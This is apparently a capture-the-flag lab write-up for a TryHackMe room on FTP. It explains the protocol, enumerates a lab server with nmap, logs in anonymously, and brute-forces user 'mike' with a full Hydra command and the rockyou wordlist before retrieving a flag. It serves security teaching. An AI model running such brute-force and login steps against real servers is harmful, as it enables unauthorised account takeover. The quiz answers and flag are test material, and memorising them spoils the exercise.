# [Task 8] Understanding FTP

**What is FTP?**

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.

**How does FTP work?**

A typical FTP session operates using two channels:

* a command (sometimes called the control) channel
* a data channel. 

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the server.

**Active vs Passive**

The FTP server may support either Active or Passive connections, or both. 

* In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
* In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.  

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.

**More Details**

You can find more details on the technical function, and implementation of, FTP on the Internet Engineering Task Force website: https://www.ietf.org/rfc/rfc959.txt. The IETF is one of a number of standards agencies, who define and regulate internet standards.

## #8.1 - What communications model does FTP use?

Answer: `client-server`

## #8.2 - What's the standard FTP port?

FTP's default port is 21.

Answer: `21`

## #8.3 - How many modes of FTP connection are there?

There are 2 modes: active and passive.

Answer: `2`

# [Task 9] Enumerating FTP

**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**Enumeration**

By now, I don't think I need to explain any further how enumeration is key when attacking network services and protocols. You should, by now, have enough experience with nmap to be able to port scan effectively. If you get stuck using any tool- you can always use "tool [-h / -help / --help]" to find out more about it's function and syntax. Equally, man pages are extremely useful for this purpose. They can be reached using "man [tool]".
Method

We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.

**Resources**

As we're going to be logging in to an FTP server, we're going to need to make sure therre is an ftp client installed on the system. There should be one installed by default on most Linux operating systems, such as Kali or Parrot OS. You can test if there is one by typing "ftp" into the console. If you're bought to a prompt that says: "ftp>" Then you have a working FTP client on your system. If not, it's a simple matter of using "sudo apt install ftp" to install one.
Alternative Enumeration Methods

It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that don’t. This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP.

This vulnerability is documented at: https://www.exploit-db.com/exploits/20745 

Now we understand our toolbox, let's do this.                 

## #9.1 - Run an nmap scan of your choice. How many ports are open on the target machine? 

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24 11:16 PUBLIC_NOTICE.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: Host: Welcome
~~~

According to a basic nmap scan, 1 port is opened on the server.

Answer: `1`

## #9.2 - What port is this?

Answer: `21`

## #9.3 - What variant of FTP is running on it?  

Answer: `vsftpd`

## #9.4

**Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.**

**What is the name of the file in the anonymous FTP directory?**

Let's connect and list the files on the server:

~~~
$ ftp 10.10.168.170
Connected to 10.10.168.170 (10.10.168.170).
220 Welcome to the administrator FTP service.
Name (10.10.168.170:unknown): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
227 Entering Passive Mode (10,10,168,170,159,81).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Apr 24 11:17 .
drwxr-xr-x    2 0        0            4096 Apr 24 11:17 ..
-rw-r--r--    1 0        0             353 Apr 24 11:16 PUBLIC_NOTICE.txt
~~~

Answer: `PUBLIC_NOTICE.txt`

## #9.5 - What do we think a possible username could be?

Let's download the file:

~~~
ftp> get PUBLIC_NOTICE.txt
local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
227 Entering Passive Mode (10,10,168,170,60,213).
150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
226 Transfer complete.
353 bytes received in 0.00188 secs (187.47 Kbytes/sec)
ftp> quit
221 Goodbye.
~~~

The file is signed by Mike, who could be a potential user.

~~~
$ cat PUBLIC_NOTICE.txt 
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike 
~~~

Answer: `mike`

## #9.6 - Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...


# [Task 10] Exploiting FTP

**Types of FTP Exploit**

Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.

With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by [JSCape](https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP) demonstrates and explains this process using APR-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.

When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.

**Method Breakdown**

So, from our enumeration stage, we know:

* There is an FTP server running on this machine
* We have a possible username

Using this information, let's try and bruteforce the password of the FTP Server.

**Hydra**

Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub [here](https://github.com/vanhauser-thc/thc-hydra).

The syntax for the command we're going to use to find the passwords is this:

~~~
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
~~~

Let's break it down:

SECTION | FUNCTION
---|---
`hydra` | Runs the hydra tool
`-t 4` | Number of parallel connections per target
`-l [user]` | Points to the user who's account you're trying to compromise
`-P [path to dictionary]` | Points to the file containing the list of possible passwords
`-vV` | Sets verbose mode to very verbose, shows the login+pass combination for each attempt
`[machine IP]` | The IP address of the target machine
`ftp / protocol` | Sets the protocol

Let's crack some passwords!

## #10.1 - What is the password for the user "mike"?

Let's start a brute force attack against `mike` with hydra:

~~~
$ hydra -l mike -P /data/src/wordlists/rockyou.txt -t 4 ftp://10.10.168.170
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-17 08:45:39
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ftp://10.10.168.170:21/
[21][ftp] host: 10.10.168.170   login: mike   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-17 08:45:44
~~~

Mike's FTP password is `password`

## #10.2 - Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted

Now, let's connect with `mike:password`.

~~~
$ ftp 10.10.168.170
Connected to 10.10.168.170 (10.10.168.170).
220 Welcome to the administrator FTP service.
Name (10.10.168.170:unknown): mike
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
227 Entering Passive Mode (10,10,168,170,236,222).
150 Here comes the directory listing.
drwxrwxrwx    5 1002     1006         4096 Apr 24 11:20 .
drwxr-xr-x    5 0        0            4096 Apr 24 11:20 ..
-rw-r--r--    1 0        0               0 Apr 24 11:20 .bash_history
-rw-r--r--    1 1002     1006          220 Apr 24 11:20 .bash_logout
-rw-r--r--    1 1002     1006         3771 Apr 24 11:20 .bashrc
drwx------    2 0        0            4096 Apr 24 11:20 .cache
drwx------    3 0        0            4096 Apr 24 11:20 .gnupg
-rw-r--r--    1 1002     1006          807 Apr 24 11:20 .profile
-rw-r--r--    1 0        0               0 Apr 24 11:20 .sudo_as_admin_successful
drwxrwxrwx    2 0        0            4096 Apr 24 11:20 ftp
-rwxrwxrwx    1 0        0              26 Apr 24 11:20 ftp.txt
226 Directory send OK.
ftp> 
~~~

## #10.3 - What is ftp.txt?

We see a file named `ftp.txt`. Let's download it:

~~~
ftp> get ftp.txt
local: ftp.txt remote: ftp.txt
227 Entering Passive Mode (10,10,168,170,236,3).
150 Opening BINARY mode data connection for ftp.txt (26 bytes).
226 Transfer complete.
26 bytes received in 0.000905 secs (28.73 Kbytes/sec)
ftp>
~~~

The file contains a flag:

~~~
$ cat ftp.txt 
THM{y0u_g0t_th3_ftp_fl4g}
~~~
